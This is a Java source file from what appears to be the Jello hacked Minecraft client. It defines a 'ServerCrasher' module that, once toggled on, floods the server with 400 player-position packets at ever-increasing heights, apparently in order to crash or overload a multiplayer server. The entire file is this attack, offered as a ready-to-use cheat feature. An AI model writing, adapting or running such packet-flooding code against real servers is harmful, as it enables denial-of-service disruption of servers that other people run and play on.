package com.mentalfrostbyte.jello.modules;

import java.util.Random;

import org.lwjgl.input.Keyboard;

import com.mentalfrostbyte.jello.event.EventManager;
import com.mentalfrostbyte.jello.event.EventTarget;
import com.mentalfrostbyte.jello.main.Jello;
import com.mentalfrostbyte.jello.main.Module;
import com.mentalfrostbyte.jello.util.BooleanValue;

import net.minecraft.network.play.client.C03PacketPlayer;
import net.minecraft.network.play.client.C03PacketPlayer.C04PacketPlayerPosition;

public class ServerCrasher extends Module {
	
	public ServerCrasher() {
        super("ServerCrasher", Keyboard.KEY_NONE);
        this.jelloCat = Jello.tabgui.cats.get(1);
    }
   
	@SuppressWarnings("null")
	public void onEnable(){
		times = 0;
	}
	
	public void onDisable(){
		
	}
	
    int times;
	@SuppressWarnings("null")
	public void onUpdate()
	{
		if(!this.isToggled())
			return; 
		if(times < 400) {
			times += 1;
			Jello.addChatMessage(String.valueOf(times));
			mc.thePlayer.motionY = 0;
		//		mc.thePlayer.setPosition(mc.thePlayer.posX + times, mc.thePlayer.posY, mc.thePlayer.posZ);
			mc.thePlayer.sendQueue.addToSendQueue(new C04PacketPlayerPosition(mc.thePlayer.posX, mc.thePlayer.posY + times, mc.thePlayer.posZ, true));
			
			
		}
		
	}
}
